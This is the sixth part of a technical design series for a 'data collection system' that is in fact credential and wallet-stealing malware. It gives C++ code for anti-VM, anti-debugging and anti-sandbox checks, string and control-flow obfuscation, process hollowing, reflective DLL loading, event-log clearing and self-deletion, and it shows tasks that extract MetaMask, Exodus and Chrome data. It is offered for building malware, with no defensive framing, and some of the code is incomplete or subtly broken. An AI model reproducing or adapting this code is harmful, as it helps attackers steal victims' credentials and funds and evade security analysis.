# Evasion & Optimization

## Document Purpose

This document covers stealth techniques, anti-detection methods, and performance optimization strategies.

---

## Evasion Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    EVASION STRATEGY                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LAYER 1: PRE-EXECUTION                                     │
│  ───────────────────                                        │
│  • File obfuscation                                        │
│  • Signature hiding                                        │
│  • Packing/encryption                                      │
│                                                             │
│  LAYER 2: ENVIRONMENT CHECKS                                │
│  ──────────────────────                                     │
│  • Anti-VM detection                                       │
│  • Anti-debugging                                          │
│  • Anti-sandbox                                            │
│                                                             │
│  LAYER 3: RUNTIME STEALTH                                   │
│  ──────────────────────                                     │
│  • Process hiding                                          │
│  • Fileless execution                                      │
│  • Memory encryption                                       │
│                                                             │
│  LAYER 4: NETWORK STEALTH                                   │
│  ──────────────────────                                     │
│  • Traffic encryption                                      │
│  • Domain generation                                       │
│  • Fast-flux DNS                                           │
│                                                             │
│  LAYER 5: FORENSIC RESISTANCE                               │
│  ──────────────────────────                                 │
│  • Log clearing                                            │
│  • Self-destruction                                        │
│  • Timestomping                                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. Anti-VM Detection

### Virtual Machine Indicators

```cpp
// anti_vm.h

#pragma once

#include <string>
#include <vector>

class AntiVM {
public:
    // Check all VM indicators
    static bool isVirtualMachine();
    
    // Individual checks
    static bool hasVMDrivers();
    static bool hasVMHardware();
    static bool hasVMMACAddress();
    static bool hasVMProcesses();
    static bool hasVMRegistryKeys();
    static bool hasLowResources();
    
    // Get detected VM type
    static std::string getVMType();
    
private:
    static std::vector<std::string> VM_DRIVERS;
    static std::vector<std::string> VM_PROCESSES;
    static std::vector<std::string> VM_REGISTRY_KEYS;
};

// anti_vm.cpp

#ifdef _WIN32
#include <windows.h>
#endif

bool AntiVM::isVirtualMachine() {
    if (hasVMDrivers()) return true;
    if (hasVMHardware()) return true;
    if (hasVMMACAddress()) return true;
    if (hasVMProcesses()) return true;
    if (hasVMRegistryKeys()) return true;
    if (hasLowResources()) return true;
    
    return false;
}

bool AntiVM::hasVMDrivers() {
    // Check for VM-specific drivers
    VM_DRIVERS = {
        "VBoxMouse",
        "VBoxGuest",
        "VBoxService",
        "VBoxSF",
        "vmmouse",
        "VMTools",
        "VMware Service",
        "vmci",
        "vmmemctl"
    };
    
    #ifdef _WIN32
    for (const auto& driver : VM_DRIVERS) {
        HKEY hKey;
        std::string path = "SYSTEM\\CurrentControlSet\\Services\\" + driver;
        
        if (RegOpenKeyA(HKEY_LOCAL_MACHINE, path.c_str(), &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    #endif
    
    return false;
}

bool AntiVM::hasVMHardware() {
    // Check BIOS information
    std::string biosVendor = getBIOSVendor();
    std::string biosVersion = getBIOSVersion();
    
    // VM-specific BIOS strings
    if (biosVendor.find("innotek") != std::string::npos) return true;  // VirtualBox
    if (biosVendor.find("vmware") != std::string::npos) return true;
    if (biosVendor.find("xen") != std::string::npos) return true;
    if (biosVendor.find("qemu") != std::string::npos) return true;
    
    // Check for VM-specific hardware
    if (hasVMCIDevice()) return true;  // VMware
    if (hasVBoxVideo()) return true;   // VirtualBox
    
    return false;
}

bool AntiVM::hasVMMACAddress() {
    // VM-specific MAC address prefixes
    std::vector<std::string> VM_MAC_PREFIXES = {
        "00:0C:29",  // VMware
        "00:05:69",  // VMware
        "00:50:56",  // VMware
        "08:00:27",  // VirtualBox
        "00:1C:42",  // Parallels
        "00:16:3E",  // Xen
        "0A:00:27"   // VirtualBox
    };
    
    std::string mac = getMACAddress();
    
    for (const auto& prefix : VM_MAC_PREFIXES) {
        if (mac.find(prefix) == 0) {
            return true;
        }
    }
    
    return false;
}

bool AntiVM::hasVMProcesses() {
    VM_PROCESSES = {
        "vboxservice.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "xenclient.exe"
    };
    
    auto runningProcesses = getRunningProcesses();
    
    for (const auto& process : VM_PROCESSES) {
        if (std::find(runningProcesses.begin(), 
                      runningProcesses.end(), 
                      process) != runningProcesses.end()) {
            return true;
        }
    }
    
    return false;
}

bool AntiVM::hasVMRegistryKeys() {
    #ifdef _WIN32
    VM_REGISTRY_KEYS = {
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\XenProject Tools",
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "HARDWARE\\ACPI\\RSDT\\VBOX__"
    };
    
    for (const auto& key : VM_REGISTRY_KEYS) {
        HKEY hKey;
        if (RegOpenKeyA(HKEY_LOCAL_MACHINE, key.c_str(), &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    #endif
    
    return false;
}

bool AntiVM::hasLowResources() {
    // VMs often have limited resources
    int cpuCount = getCPUCount();
    size_t ramAmount = getRAMAmount();
    
    // Suspicious if:
    // • Less than 2 CPU cores
    // • Less than 2GB RAM
    if (cpuCount < 2) return true;
    if (ramAmount < 2 * 1024 * 1024 * 1024) return true;
    
    return false;
}

std::string AntiVM::getVMType() {
    if (hasVMDrivers()) {
        auto drivers = getVMDrivers();
        if (drivers.find("VBox") != std::string::npos) {
            return "VirtualBox";
        }
        if (drivers.find("vmware") != std::string::npos) {
            return "VMware";
        }
    }
    
    if (hasVMMACAddress()) {
        std::string mac = getMACAddress();
        if (mac.find("08:00:27") == 0) {
            return "VirtualBox";
        }
        if (mac.find("00:0C:29") == 0) {
            return "VMware";
        }
    }
    
    return "Unknown";
}
```

---

## 2. Anti-Debugging

### Debugger Detection

```cpp
// anti_debug.h

#pragma once

class AntiDebug {
public:
    // Check if debugger is present
    static bool isDebuggerPresent();
    
    // Advanced checks
    static bool isRemoteDebugger();
    static bool isKernelDebugger();
    
    // Anti-debugging techniques
    static void hideFromDebugger();
    static void detectBreakpoint();
    
private:
    // Windows APIs
    static bool checkIsDebuggerPresent();
    static bool checkRemoteDebuggerPresent();
    static bool checkNtGlobalFlag();
    static bool checkHeapFlags();
    static bool checkProcessDebugFlags();
    
    // Timing checks
    static bool timingCheck();
    
    // Exception-based check
    static bool exceptionCheck();
};

// anti_debug.cpp

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#endif

bool AntiDebug::isDebuggerPresent() {
    if (checkIsDebuggerPresent()) return true;
    if (checkRemoteDebuggerPresent()) return true;
    if (checkNtGlobalFlag()) return true;
    if (checkHeapFlags()) return true;
    if (checkProcessDebugFlags()) return true;
    if (timingCheck()) return true;
    
    return false;
}

bool AntiDebug::checkIsDebuggerPresent() {
    #ifdef _WIN32
    return IsDebuggerPresent();
    #else
    return false;
    #endif
}

bool AntiDebug::checkRemoteDebuggerPresent() {
    #ifdef _WIN32
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    return isDebugged;
    #else
    return false;
    #endif
}

bool AntiDebug::checkNtGlobalFlag() {
    #ifdef _WIN32
    // PEB (Process Environment Block) contains debug flags
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    typedef NTSTATUS (NTAPI *NtQueryInformationProcessFn)(
        HANDLE, ULONG, PVOID, ULONG, PULONG
    );
    
    auto NtQueryInformationProcess = 
        (NtQueryInformationProcessFn)GetProcAddress(
            hNtdll, "NtQueryInformationProcess"
        );
    
    if (!NtQueryInformationProcess) return false;
    
    struct PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        void* PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    };
    
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    
    if (NtQueryInformationProcess(GetCurrentProcess(), 
                                  0, 
                                  &pbi, 
                                  sizeof(pbi), 
                                  &returnLength) != 0) {
        return false;
    }
    
    // Read NtGlobalFlag from PEB
    DWORD ntGlobalFlag = *(DWORD*)((char*)pbi.PebBaseAddress + 0xBC);
    
    // Debug flags: FLG_HEAP_ENABLE_TAIL_CHECK, etc.
    const DWORD DEBUG_FLAGS = 0x70;
    
    return (ntGlobalFlag & DEBUG_FLAGS) != 0;
    #else
    return false;
    #endif
}

bool AntiDebug::checkHeapFlags() {
    #ifdef _WIN32
    // Heap flags can indicate debugging
    HANDLE hHeap = GetProcessHeap();
    
    // Read heap flags
    // ForceFlags at offset 0x40 (64-bit) or 0x14 (32-bit)
    #ifdef _WIN64
    DWORD forceFlags = *(DWORD*)((char*)hHeap + 0x40);
    #else
    DWORD forceFlags = *(DWORD*)((char*)hHeap + 0x14);
    #endif
    
    // Debug flags
    const DWORD HEAP_GROWABLE = 2;
    
    return (forceFlags & ~HEAP_GROWABLE) != 0;
    #else
    return false;
    #endif
}

bool AntiDebug::timingCheck() {
    // Debuggers slow down execution
    auto start = std::chrono::high_resolution_clock::now();
    
    // Perform some computation
    volatile int result = 0;
    for (int i = 0; i < 1000000; ++i) {
        result += i;
    }
    
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(
        end - start
    ).count();
    
    // If it took too long, debugger is likely attached
    // Threshold depends on the operation
    if (duration > 10000) {  // 10ms threshold
        return true;
    }
    
    return false;
}

bool AntiDebug::exceptionCheck() {
    #ifdef _WIN32
    // Debuggers catch exceptions
    __try {
        // Cause an exception
        *(int*)0 = 0;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // If we get here, exception was handled
        // In a debugger, this would be caught
        return false;
    }
    
    // If we reach here, no exception handler worked
    // Likely in a debugger
    return true;
    #else
    return false;
    #endif
}

void AntiDebug::hideFromDebugger() {
    #ifdef _WIN32
    // Remove debugger presence
    // Note: This is advanced and may not work on all systems
    
    // Clear PEB debug flags
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    typedef NTSTATUS (NTAPI *NtSetInformationProcessFn)(
        HANDLE, ULONG, PVOID, ULONG
    );
    
    auto NtSetInformationProcess = 
        (NtSetInformationProcessFn)GetProcAddress(
            hNtdll, "NtSetInformationProcess"
        );
    
    if (NtSetInformationProcess) {
        // Clear debug flags
        ULONG debugFlags = 0;
        NtSetInformationProcess(GetCurrentProcess(), 
                                0x1F,  // ProcessDebugFlags
                                &debugFlags, 
                                sizeof(debugFlags));
    }
    #endif
}
```

---

## 3. Anti-Sandbox

### Sandbox Detection

```cpp
// anti_sandbox.h

#pragma once

class AntiSandbox {
public:
    // Check if running in sandbox
    static bool isSandbox();
    
    // Specific sandbox checks
    static bool isCuckoo();
    static bool isJoeSandbox();
    static bool isAnyRun();
    static bool isHybridAnalysis();
    
    // User activity check
    static bool hasUserActivity();
    
    // Sleep delay check
    static bool sleepDelayCheck();
    
private:
    // Check for sandbox artifacts
    static bool checkSandboxArtifacts();
    
    // Check for analysis tools
    static bool checkAnalysisTools();
    
    // Check system uptime
    static bool checkUptime();
    
    // Check installed applications
    static bool checkInstalledApps();
};

bool AntiSandbox::isSandbox() {
    if (isCuckoo()) return true;
    if (isJoeSandbox()) return true;
    if (isAnyRun()) return true;
    if (isHybridAnalysis()) return true;
    if (checkSandboxArtifacts()) return true;
    if (checkAnalysisTools()) return true;
    if (checkUptime()) return true;
    if (checkInstalledApps()) return true;
    if (!hasUserActivity()) return true;
    if (!sleepDelayCheck()) return true;
    
    return false;
}

bool AntiSandbox::isCuckoo() {
    // Cuckoo sandbox indicators
    #ifdef _WIN32
    // Check for Cuckoo processes
    if (isProcessRunning("cuckoo")) return true;
    
    // Check for Cuckoo files
    if (fileExists("C:\\cuckoo")) return true;
    if (fileExists("C:\\python27\\cuckoo")) return true;
    
    // Check registry
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, 
                    "SOFTWARE\\Cuckoo", 
                    &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    #endif
    
    // Check hostname
    std::string hostname = getHostname();
    if (hostname.find("cuckoo") != std::string::npos) return true;
    
    return false;
}

bool AntiSandbox::hasUserActivity() {
    // Sandboxes often have no user interaction
    
    // Check mouse clicks
    if (getMouseClickCount() < 5) return false;
    
    // Check keyboard input
    if (getKeyPressCount() < 10) return false;
    
    // Check for user directories
    if (!directoryExists(getDocumentsPath())) return false;
    if (!directoryExists(getDesktopPath())) return false;
    
    // Check for browser history
    if (getBrowserHistoryCount() < 10) return false;
    
    return true;
}

bool AntiSandbox::checkUptime() {
    // Sandboxes are often freshly booted
    uint64_t uptime = getSystemUptime();
    
    // Less than 5 minutes is suspicious
    if (uptime < 5 * 60 * 1000) {
        return true;
    }
    
    return false;
}

bool AntiSandbox::checkInstalledApps() {
    // Sandboxes have minimal software
    int appCount = getInstalledApplicationCount();
    
    // Less than 10 applications is suspicious
    if (appCount < 10) {
        return true;
    }
    
    return false;
}

bool AntiSandbox::sleepDelayCheck() {
    // Sandboxes often skip or accelerate sleep
    
    auto start = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end = std::chrono::steady_clock::now();
    
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(
        end - start
    ).count();
    
    // If sleep was too short (< 3 seconds), sandbox detected
    if (duration < 3000) {
        return false;
    }
    
    return true;
}
```

---

## 4. Code Obfuscation

### String Encryption

```cpp
// string_obfuscation.h

#pragma once

#include <string>
#include <vector>
#include <random>

class StringObfuscator {
public:
    // Encrypt string at compile time
    static constexpr std::array<char, N> encrypt(const char* str);
    
    // Decrypt string at runtime
    static std::string decrypt(const std::array<char, N>& encrypted);
    
    // Runtime encryption
    static std::vector<uint8_t> encrypt(const std::string& str, 
                                        const std::vector<uint8_t>& key);
    
    // Runtime decryption
    static std::string decrypt(const std::vector<uint8_t>& encrypted,
                               const std::vector<uint8_t>& key);
    
private:
    // XOR encryption
    static std::vector<uint8_t> xorEncrypt(
        const std::vector<uint8_t>& data,
        const std::vector<uint8_t>& key
    );
    
    // Generate random key
    static std::vector<uint8_t> generateKey(size_t length);
};

// Usage example
#define OBFUSCATE(str) StringObfuscator::decrypt( \
    StringObfuscator::encrypt(str) \
)

// In code:
const auto encryptedFunc = OBFUSCATE("CreateProcessA");
const auto funcAddr = GetProcAddress(hModule, encryptedFunc.c_str());

// Instead of:
// GetProcAddress(hModule, "CreateProcessA");
```

### Control Flow Obfuscation

```cpp
// control_flow_obfuscation.h

#pragma once

// Opaque predicates
#define OPAQUE_PREDICATE() (reinterpret_cast<uintptr_t>(&global_var) % 2 == 0)

// Bogus control flow
#define BOGUS_FLOW() \
    do { \
        int bogus = rand(); \
        if (bogus > 10000) { \
            // Dead code \
            exit(1); \
        } \
    } while (0)

// Example usage
void sensitiveFunction() {
    // Bogus control flow
    BOGUS_FLOW();
    
    // Opaque predicate
    if (OPAQUE_PREDICATE()) {
        // Real code
        doSomething();
    } else {
        // Dead code (never executed)
        doSomethingElse();
    }
    
    // More bogus flow
    BOGUS_FLOW();
}

// Control flow flattening
void flattenedControlFlow() {
    int state = 0;
    
    while (state != 99) {
        switch (state) {
            case 0:
                // Initial setup
                state = 1;
                break;
                
            case 1:
                // First operation
                doOperation1();
                state = 2;
                break;
                
            case 2:
                // Second operation
                doOperation2();
                state = 3;
                break;
                
            case 3:
                // Final operation
                doOperation3();
                state = 99;
                break;
                
            default:
                state = 99;
        }
    }
}
```

---

## 5. Process Injection

### Process Hollowing

```cpp
// process_injection.h

#pragma once

#include <windows.h>

class ProcessInjector {
public:
    // Inject into suspended process
    static bool injectIntoProcess(const std::string& targetProcess,
                                  const std::vector<uint8_t>& payload);
    
    // Inject into current process
    static bool injectIntoCurrentProcess(const std::vector<uint8_t>& payload);
    
private:
    static bool createSuspendedProcess(const std::string& path,
                                       PROCESS_INFORMATION& pi);
    
    static bool hollowProcess(HANDLE hProcess,
                              const std::vector<uint8_t>& payload);
    
    static bool writePayload(HANDLE hProcess,
                             void* baseAddress,
                             const std::vector<uint8_t>& payload);
    
    static bool resumeThread(HANDLE hThread);
};

bool ProcessInjector::injectIntoProcess(
    const std::string& targetProcess,
    const std::vector<uint8_t>& payload) {
    
    PROCESS_INFORMATION pi = {};
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!createSuspendedProcess(targetProcess, pi)) {
        return false;
    }
    
    // Hollow out the process
    if (!hollowProcess(pi.hProcess, payload)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Resume thread
    if (!resumeThread(pi.hThread)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return true;
}

bool ProcessInjector::createSuspendedProcess(
    const std::string& path,
    PROCESS_INFORMATION& pi) {
    
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    
    std::string cmdLine = path;
    
    // CREATE_SUSPENDED flag
    if (!CreateProcessA(
            NULL,
            (LPSTR)cmdLine.c_str(),
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
        return false;
    }
    
    return true;
}

bool ProcessInjector::hollowProcess(
    HANDLE hProcess,
    const std::vector<uint8_t>& payload) {
    
    // Get process information
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    
    typedef NTSTATUS (NTAPI *NtQueryInformationProcessFn)(
        HANDLE, ULONG, PVOID, ULONG, PULONG
    );
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtQueryInformationProcess = 
        (NtQueryInformationProcessFn)GetProcAddress(
            hNtdll, "NtQueryInformationProcess"
        );
    
    if (!NtQueryInformationProcess) {
        return false;
    }
    
    if (NtQueryInformationProcess(hProcess, 
                                  0, 
                                  &pbi, 
                                  sizeof(pbi), 
                                  &returnLength) != 0) {
        return false;
    }
    
    // Read PE header
    void* baseAddress = pbi.PebBaseAddress;
    
    // Unmap original memory
    typedef NTSTATUS (NTAPI *NtUnmapViewOfSectionFn)(
        HANDLE, PVOID
    );
    
    auto NtUnmapViewOfSection = 
        (NtUnmapViewOfSectionFn)GetProcAddress(
            hNtdll, "NtUnmapViewOfSection"
        );
    
    if (NtUnmapViewOfSection(hProcess, baseAddress) != 0) {
        return false;
    }
    
    // Allocate new memory
    void* newBase = VirtualAllocEx(
        hProcess,
        baseAddress,
        payload.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!newBase) {
        return false;
    }
    
    // Write payload
    if (!WriteProcessMemory(hProcess, newBase, payload.data(), payload.size(), NULL)) {
        return false;
    }
    
    // Set entry point
    // (Modify thread context to start at new entry point)
    
    return true;
}
```

---

## 6. Fileless Execution

### Reflective DLL Injection

```cpp
// reflective_loader.h

#pragma once

#include <windows.h>

class ReflectiveLoader {
public:
    // Load DLL from memory
    static HMODULE loadFromMemory(const std::vector<uint8_t>& dllData);
    
    // Execute exported function
    static bool executeFunction(HMODULE hModule, 
                                const std::string& functionName);
    
private:
    static void* resolveFunction(const std::string& name);
    static void setupPEB(HMODULE hModule);
};

HMODULE ReflectiveLoader::loadFromMemory(
    const std::vector<uint8_t>& dllData) {
    
    // Parse PE header
    auto* dosHeader = (PIMAGE_DOS_HEADER)dllData.data();
    auto* ntHeader = (PIMAGE_NT_HEADERS)(
        (uintptr_t)dllData.data() + dosHeader->e_lfanew
    );
    
    // Allocate memory for DLL
    HMODULE hModule = (HMODULE)VirtualAlloc(
        NULL,
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!hModule) {
        return NULL;
    }
    
    // Copy headers
    memcpy(hModule, dllData.data(), ntHeader->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    auto* section = IMAGE_FIRST_SECTION(ntHeader);
    
    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i) {
        void* dest = (void*)((uintptr_t)hModule + section[i].VirtualAddress);
        void* src = (void*)((uintptr_t)dllData.data() + section[i].PointerToRawData);
        
        memcpy(dest, src, section[i].SizeOfRawData);
    }
    
    // Process relocations
    processRelocations(hModule, ntHeader);
    
    // Process imports
    processImports(hModule);
    
    // Set memory protections
    protectMemory(hModule, ntHeader);
    
    // Call DllMain
    typedef BOOL (WINAPI *DllMainFn)(HMODULE, DWORD, LPVOID);
    auto DllMain = (DllMainFn)((uintptr_t)hModule + 
                               ntHeader->OptionalHeader.AddressOfEntryPoint);
    
    DllMain(hModule, DLL_PROCESS_ATTACH, NULL);
    
    return hModule;
}
```

---

## 7. Performance Optimization

### Parallel Execution

```cpp
// parallel_executor.h

#pragma once

#include <vector>
#include <future>
#include <thread>

class ParallelExecutor {
public:
    ParallelExecutor(size_t threadCount);
    
    // Execute tasks in parallel
    template<typename Func>
    std::future<typename std::result_of<Func()>::type> submit(Func func);
    
    // Execute and wait
    template<typename Func>
    typename std::result_of<Func()>::type execute(Func func);
    
    // Batch execute
    template<typename Func, typename T>
    std::vector<T> executeBatch(const std::vector<Func>& funcs);
    
private:
    std::vector<std::thread> m_workers;
    std::queue<std::function<void()>> m_tasks;
    std::mutex m_mutex;
    std::condition_variable m_condition;
    bool m_shutdown;
};

// Usage
ParallelExecutor executor(8);  // 8 threads

// Submit tasks
std::vector<std::future<bool>> futures;

futures.push_back(executor.submit([]() {
    return extractMetaMask();
}));

futures.push_back(executor.submit([]() {
    return extractExodus();
}));

futures.push_back(executor.submit([]() {
    return extractChrome();
}));

// Wait for all
for (auto& future : futures) {
    future.get();
}
```

### Memory Pooling

```cpp
// memory_pool.h

#pragma once

#include <vector>
#include <memory>

template<typename T>
class MemoryPool {
public:
    MemoryPool(size_t initialSize = 1024);
    
    // Allocate from pool
    T* allocate();
    
    // Return to pool
    void deallocate(T* ptr);
    
    // Get statistics
    size_t getAllocatedCount() const;
    size_t getPoolSize() const;
    
private:
    std::vector<T> m_pool;
    std::vector<T*> m_freeList;
    std::mutex m_mutex;
};

// Usage for data blobs
MemoryPool<DataBlob> blobPool(100);

// Allocate
DataBlob* blob = blobPool.allocate();
blob->name = "test";
blob->data = ...;

// Use
processBlob(blob);

// Return to pool
blobPool.deallocate(blob);

// Reduces memory allocation overhead
// Improves performance for frequent allocations
```

---

## 8. Cleanup & Forensics

### Log Clearing

```cpp
// cleanup.h

#pragma once

class Cleanup {
public:
    // Clear all traces
    static void clearAllTraces();
    
    // Clear event logs
    static void clearEventLogs();
    
    // Clear prefetch
    static void clearPrefetch();
    
    // Clear recent files
    static void clearRecentFiles();
    
    // Clear clipboard
    static void clearClipboard();
    
    // Delete self
    static void deleteSelf();
    
    // Timestomp files
    static void timestompFile(const std::string& path);
};

void Cleanup::clearEventLogs() {
    #ifdef _WIN32
    // Clear System, Application, Security logs
    const char* logs[] = {
        "System",
        "Application",
        "Security"
    };
    
    for (const auto& log : logs) {
        HANDLE hLog = OpenEventLogA(NULL, log);
        if (hLog) {
            ClearEventLogA(hLog, NULL);
            CloseEventLog(hLog);
        }
    }
    #endif
}

void Cleanup::deleteSelf() {
    // Delete executable after execution
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    // Create batch file to delete after exit
    std::string batchFile = std::string(path) + ".bat";
    
    FILE* f = fopen(batchFile.c_str(), "w");
    fprintf(f, "@echo off\n");
    fprintf(f, "timeout /t 2 /nobreak > nul\n");
    fprintf(f, "del \"%s\"\n", path);
    fprintf(f, "del \"%s\"\n", batchFile.c_str());
    fclose(f);
    
    // Execute batch file
    system(batchFile.c_str());
    
    // Exit
    exit(0);
}
```

---

**Document:** 06/06  
**Version:** 1.0  
**Classification:** Technical Architecture

---

## Series Complete

This concludes the 6-document technical architecture series covering the complete design and implementation of the data collection system.

**Documents:**
1. `01-system-overview.md` - High-level architecture
2. `02-core-engine.md` - Core components and orchestration
3. `03-module-design.md` - Module interface and implementation
4. `04-data-extraction.md` - Extraction techniques
5. `05-output-exfiltration.md` - Output processing and transmission
6. `06-evasion-optimization.md` - Stealth and optimization